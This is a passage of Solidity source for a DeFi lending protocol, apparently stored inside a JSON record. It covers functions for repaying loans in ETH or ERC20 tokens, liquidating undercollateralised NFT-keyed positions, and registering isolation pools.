paybackExactAmountETH(\n        uint256 _nftId\n    )\n        external\n        payable\n        syncPool(WETH_ADDRESS)\n        returns (uint256)\n    {\n        uint256 maxBorrowShares = userBorrowShares[_nftId][WETH_ADDRESS];\n\n        _validateNonZero(\n            maxBorrowShares\n        );\n\n        uint256 maxPaybackAmount = paybackAmount(\n            WETH_ADDRESS,\n            maxBorrowShares\n        );\n\n        uint256 paybackShares = calculateBorrowShares(\n            {\n                _poolToken: WETH_ADDRESS,\n                _amount: msg.value,\n                _maxSharePrice: false\n            }\n        );\n\n        _validateNonZero(\n            paybackShares\n        );\n\n        uint256 refundAmount;\n        uint256 requiredAmount = msg.value;\n\n        if (msg.value > maxPaybackAmount) {\n\n            unchecked {\n                refundAmount = msg.value\n                    - maxPaybackAmount;\n            }\n\n            requiredAmount = requiredAmount\n                - refundAmount;\n\n            paybackShares = maxBorrowShares;\n        }\n\n        _handlePayback(\n            msg.sender,\n            _nftId,\n            WETH_ADDRESS,\n            requiredAmount,\n            paybackShares\n        );\n\n        _wrapETH(\n            requiredAmount\n        );\n\n        if (refundAmount > 0) {\n            _sendValue(\n                msg.sender,\n                refundAmount\n            );\n        }\n\n        return paybackShares;\n    }\n\n    /**\n     * @dev Ability to payback ERC20 loans\n     * by providing exact payback amount.\n     */\n    function paybackExactAmount(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount\n    )\n        external\n        syncPool(_poolToken)\n        returns (uint256)\n    {\n        uint256 paybackShares = calculateBorrowShares(\n            {\n                _poolToken: _poolToken,\n                _amount: _amount,\n                _maxSharePrice: false\n            }\n        );\n\n        _validateNonZero(\n            paybackShares\n        );\n\n        _handlePayback(\n            msg.sender,\n            _nftId,\n            _poolToken,\n            _amount,\n            paybackShares\n        );\n\n        _safeTransferFrom(\n            _poolToken,\n            msg.sender,\n            address(this),\n            _amount\n        );\n\n        return paybackShares;\n    }\n\n    /**\n     * @dev Ability to payback ERC20 loans\n     * by providing exact payback shares.\n     */\n    function paybackExactShares(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _shares\n    )\n        external\n        syncPool(_poolToken)\n        returns (uint256)\n    {\n        uint256 repaymentAmount = paybackAmount(\n            _poolToken,\n            _shares\n        );\n\n        _validateNonZero(\n            repaymentAmount\n        );\n\n        _handlePayback(\n            msg.sender,\n            _nftId,\n            _poolToken,\n            repaymentAmount,\n            _shares\n        );\n\n        _safeTransferFrom(\n            _poolToken,\n            msg.sender,\n            address(this),\n            repaymentAmount\n        );\n\n        return repaymentAmount;\n    }\n\n    // --------------- Liquidation Functions ------------\n\n    /**\n     * @dev Function to liquidate a postion which reaches\n     * a debt ratio greater than 100%. The liquidator can choose\n     * token to payback and receive. (Both can differ!). The\n     * amount is in shares of the payback token. The liquidator\n     * gets an incentive which is calculated inside the liquidation\n     * logic.\n     */\n    function liquidatePartiallyFromTokens(\n        uint256 _nftId,\n        uint256 _nftIdLiquidator,\n        address _paybackToken,\n        address _receiveToken,\n        uint256 _shareAmountToPay\n    )\n        external\n        syncPool(_paybackToken)\n        syncPool(_receiveToken)\n        returns (uint256)\n    {\n        CoreLiquidationStruct memory data;\n\n        data.nftId = _nftId;\n        data.nftIdLiquidator = _nftIdLiquidator;\n\n        data.caller = msg.sender;\n\n        data.tokenToPayback = _paybackToken;\n        data.tokenToRecieve = _receiveToken;\n        data.shareAmountToPay = _shareAmountToPay;\n\n        data.maxFeeETH = WISE_SECURITY.maxFeeETH();\n        data.baseRewardLiquidation = WISE_SECURITY.baseRewardLiquidation();\n\n        (\n            data.lendTokens,\n            data.borrowTokens\n        ) = _prepareAssociatedTokens(\n            _nftId,\n            _receiveToken,\n            _paybackToken\n        );\n\n        data.paybackAmount = paybackAmount(\n            _paybackToken,\n            _shareAmountToPay\n        );\n\n        _checkPositionLocked(\n            _nftId,\n            msg.sender\n        );\n\n        _checkLiquidatorNft(\n            _nftId,\n            _nftIdLiquidator\n        );\n\n        WISE_SECURITY.checksLiquidation(\n            _nftId,\n            _paybackToken,\n            _shareAmountToPay\n        );\n\n        return _coreLiquidation(\n            data\n        );\n    }\n\n    /**\n     * @dev Wrapper function for liqudaiton flow\n     */\n    function coreLiquidationIsolationPools(\n        uint256 _nftId,\n        uint256 _nftIdLiquidator,\n        address _caller,\n        address _paybackToken,\n        address _receiveToken,\n        uint256 _paybackAmount,\n        uint256 _shareAmountToPay\n    )\n        external\n        syncPool(_paybackToken)\n        syncPool(_receiveToken)\n        returns (uint256)\n    {\n        CoreLiquidationStruct memory data;\n\n        data.nftId = _nftId;\n        data.nftIdLiquidator = _nftIdLiquidator;\n\n        data.caller = _caller;\n\n        data.paybackAmount = _paybackAmount;\n        data.tokenToPayback = _paybackToken;\n        data.tokenToRecieve = _receiveToken;\n        data.shareAmountToPay = _shareAmountToPay;\n\n        data.maxFeeETH = WISE_SECURITY.maxFeeFarmETH();\n        data.baseRewardLiquidation = WISE_SECURITY.baseRewardLiquidationFarm();\n\n        _validateIsolationPoolLiquidation(\n            msg.sender,\n            data.nftId,\n            data.nftIdLiquidator\n        );\n\n        (\n            data.lendTokens,\n            data.borrowTokens\n        ) = _prepareAssociatedTokens(\n            data.nftId,\n            data.tokenToRecieve,\n            data.tokenToPayback\n        );\n\n        return _coreLiquidation(\n            data\n        );\n    }\n\n    /**\n     * @dev Allows to sync pool manually\n     * so that the pool is up to date.\n     */\n    function syncManually(\n        address _poolToken\n    )\n        external\n        syncPool(_poolToken)\n    {\n        address[] memory tokens = new address[](1);\n        tokens[0] = _poolToken;\n\n        _curveSecurityChecks(\n            new address[](0),\n            tokens\n        );\n    }\n\n    /**\n     * @dev Registers position _nftId\n     * for isolation pool functionality\n     */\n    function setRegistrationIsolationPool(\n        uint256 _nftId,\n        bool _registerState\n    )\n        external\n    {\n        _onlyIsolationPool(\n            msg.sender\n        );\n\n        _validateZero(\n            WISE_SECURITY.overallETHCollateralsBare(_nftId)\n        );\n\n        _validateZero(\n            WISE_SECURITY.overallETHBorrowBare(_nftId)\n        );\n\n        positionLocked[_nftId] = _registerState;\n    }\n\n    /**\n    * @dev External wrapper for\n    * {_corePayback} logic callable\n    * by feeMananger.\n    */\n    function corePaybackFeeManager(\n        address _poolToken,\n        uint256 _nftId,\n        uint256 _amount,\n        uint256 _shares\n    )\n        external\n        onlyFeeManager\n        syncPool(_poolToken)\n    {\n        _corePayback(\n            _nftId,\n            _poolToken,\n            _amount,\n            _shares\n        );\n    }\n\n    /**\n     * @dev Internal function combining payback\n     * logic and emit of an event.\n     */\n    function _handlePayback(\n        address _caller,\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount,\n        uint256 _shares\n    )\n        private\n    {\n        _corePayback(\n            _nftId,\n            _poolToken,\n            _amount,\n            _shares\n        );\n\n        emit FundsReturned(\n            _caller,\n            _poolToken,\n            _nftId,\n            _amount,\n            _shares,\n            block.timestamp\n        );\n    }\n\n    function _handleWithdrawAmount(\n        address _caller,\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount,\n        bool _onBehalf\n    )"
    }
  ]
}